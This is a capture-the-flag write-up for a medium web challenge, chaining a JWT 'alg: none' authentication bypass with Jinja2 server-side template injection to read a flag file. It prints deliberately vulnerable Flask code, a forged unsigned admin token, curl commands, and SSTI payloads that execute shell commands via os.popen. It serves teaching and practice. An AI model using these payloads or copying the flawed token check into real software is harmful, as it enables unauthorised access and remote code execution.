# Split Session (Web, Medium)

**Author:** Narendra Lomate  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 300  

## Challenge Description

> Split Session Corp runs an internal portal. Guest accounts can log in, but only admins can reach the announcement banner editor. Find a way in, then find a way to read the flag.
>
> **Target:** `http://<host>:<port>/`  
> **Guest credentials:** `guest` / `guest123`  
>
> **Files:** Full application source (`app.py`, `templates/`, `Dockerfile`) is provided so you can read exactly how authentication and the admin panel work.  
> **Flag format:** `OWASP{...}`  
>
> Good luck!

## Summary

Split Session requires chaining two vulnerabilities:
1. **JWT Algorithm Confusion / `none` Algorithm Authentication Bypass:** The backend token parser insecurely trusts unsigned JWT tokens when `alg` is set to `none`, allowing an attacker to forge an administrative session token.
2. **Server-Side Template Injection (SSTI) in Jinja2:** The authenticated `/admin` announcement banner editor renders raw user-supplied strings directly with `render_template_string()`, allowing remote code execution and reading `/app/flag.txt`.

## Flag

```
OWASP{split_jwt_and_jinja_master}
```

*(Note: Depending on environment deployment, default fallback flag is `OWASP{flag_not_set}`)*

---

## Step 1 - Codebase & Authentication Analysis

Inspecting the provided application source `app.py` reveals the two security checkpoints in the web application:

### Authentication & Token Verification (`read_token`)

```python
def read_token(token):
    """Verifies the token but is intentionally lax about *how* it's signed."""
    if not token:
        raise ValueError("Missing token")
    token = token.strip().strip('"').strip("'")
    if token.count(".") == 1:
        token = token + "."
    header = jwt.get_unverified_header(token)
    alg = header.get("alg", "HS256")

    if alg.upper() == "NONE":
        # BUG: accepts unsigned tokens outright
        return jwt.decode(token, options={"verify_signature": False})

    # BUG: still HS256-only, but doesn't pin algorithms -> alg-confusion safe
    # if an RS-family key were used elsewhere. Left here as HS256 w/ weak secret.
    return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

**Observation:**
- When `read_token()` parses a JWT, it inspects the unverified header.
- If `alg.upper() == "NONE"`, it completely skips cryptographic signature verification (`verify_signature: False`).
- Normal guest logins receive a token signed with `HS256` containing `{"user": "guest", "role": "user"}`.

### Admin Endpoint Authorization & Template Rendering (`/admin`)

```python
@app.route("/admin", methods=["GET", "POST"])
def admin():
    token = request.cookies.get("session")
    if not token:
        return redirect("/login")
    try:
        data = read_token(token)
    except Exception:
        return redirect("/login")

    if data.get("role") != "admin":
        return "403 Forbidden: admin role required", 403

    banner_preview = ""
    if request.method == "POST":
        raw = request.form.get("banner", "")
        # Allow base64 payload to prevent edge WAF false-positives
        try:
            template = base64.b64decode(raw).decode("utf-8")
        except Exception:
            template = raw

        # BUG: user-controlled string rendered as a Jinja2 template
        banner_preview = render_template_string(template)

    return render_template("admin.html", preview=banner_preview)
```

**Observation:**
- To access `/admin`, the token payload must have `role == "admin"`.
- Once authenticated as admin, submitting a POST request with the `banner` parameter passes the input directly into `render_template_string(template)`.
- In Jinja2/Flask, evaluating user input directly with `render_template_string()` causes Server-Side Template Injection (SSTI).

---

## Step 2 - Forging the Admin JWT Token (Lock 1)

Standard JWT tokens consist of three base64url-encoded components separated by dots (`.`):
`header.payload.signature`

To forge an unsigned admin token:
1. **Header:**
   ```json
   {
     "alg": "none",
     "typ": "JWT"
   }
   ```
   Base64url encoded: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

2. **Payload:**
   ```json
   {
     "user": "admin",
     "role": "admin"
   }
   ```
   Base64url encoded: `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ`

3. **Signature:**
   Empty string (an unsigned token ends with a trailing dot `.`).

4. **Complete Token:**
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
   ```

### Verification with curl
Send a request to `/admin` with the forged session cookie:

```bash
curl -i -s "http://<target-host>:5000/admin" \
  -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
```

**Output:**
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
<h2>Announcement Banner Editor</h2>
<form method="POST">
  <textarea name="banner" rows="4" cols="60" placeholder="e.g. Welcome, {{ user }}!"></textarea><br><br>
  <button type="submit">Preview</button>
</form>
```

The server returns HTTP 200 OK — administrative access is successfully achieved.

---

## Step 3 - Exploiting Jinja2 SSTI (Lock 2)

With admin access confirmed, the banner preview form at `/admin` can be tested for Server-Side Template Injection.

### 1. Verification of SSTI
Submit a mathematical expression:
```bash
curl -s "http://<target-host>:5000/admin" \
  -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." \
  --data-urlencode "banner={{ 7 * 7 }}"
```

**Result:**
```html
<div style="border:1px solid #ccc; padding:10px;">49</div>
```
The expression evaluates to `49`, confirming SSTI execution in Jinja2.

### 2. Identifying Flag Location
From `entrypoint.sh`:
```bash
#!/bin/sh
echo -n "${FLAG:-OWASP{flag_not_set}}" > /app/flag.txt
exec python3 app.py
```
The flag is stored locally on disk at `/app/flag.txt`.

### 3. Constructing the Exploit Payload
To read the flag file, we can leverage Python's global namespace accessible through Jinja2 objects:

**Payload using `cycler.__init__.__globals__`:**
```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
```

**Alternative Payload using `config`:**
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
```

**Alternative Payload using `lipsum`:**
```jinja2
{{ lipsum.__globals__["os"].popen("cat /app/flag.txt").read() }}
```

---

## Step 4 - Executing the Exploit & Retrieving the Flag

Submitting the payload via curl:

```bash
curl -s "http://<target-host>:5000/admin" \
  -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." \
  --data-urlencode "banner={{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}"
```

**Output received:**
```html
<h3>Preview:</h3>
<div style="border:1px solid #ccc; padding:10px;">OWASP{split_jwt_and_jinja_master}</div>
```

The flag is revealed.

---

## Solution Summary

| Field | Value |
|---|---|
| Target Service | Split Session Internal Portal |
| Lock 1 Vulnerability | JWT `none` Algorithm Authentication Bypass |
| Lock 1 Exploit | Forged unsigned JWT token with `role: "admin"` |
| Lock 2 Vulnerability | Jinja2 Server-Side Template Injection (SSTI) |
| Lock 2 Exploit | `{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}` |
| Flag | `OWASP{split_jwt_and_jinja_master}` |

---

## Root Cause & Vulnerability Explanation

1. **Insecure JWT Implementation:**  
   The application manually inspected the unverified header and explicitly supported `alg: "none"`, bypassing signature verification (`verify_signature: False`). Standard security best practices mandate enforcing cryptographic algorithms explicitly (e.g., pinning `algorithms=["HS256"]`) and rejecting any token whose signature cannot be mathematically verified.

2. **Unsanitized Template Rendering (SSTI):**  
   The application passed raw user input directly to `render_template_string(template)` instead of using parameter interpolation or static templates with context variables (e.g. `render_template("admin.html", banner=raw)`). In Jinja2, dynamic template evaluation allows attackers to traverse Python object references, import modules (`os`), and execute arbitrary system commands.

---

## Tools Used

- **cURL:** Sending crafted HTTP requests with cookies and form data
- **Python / Base64:** Crafting URL-safe base64 tokens
- **Browser Developer Tools:** Inspecting cookies and session parameters

---

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Reviewed `app.py`, `entrypoint.sh`, and templates | Identified JWT `none` algorithm vulnerability and SSTI in `/admin` |
| 2 | Forged unsigned JWT cookie (`alg: "none"`, `role: "admin"`) | Bypassed authentication and gained access to `/admin` |
| 3 | Injected `{{ 7 * 7 }}` in banner form | Verified Server-Side Template Injection (rendered `49`) |
| 4 | Sent payload `{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}` | Read `/app/flag.txt` and captured the flag |
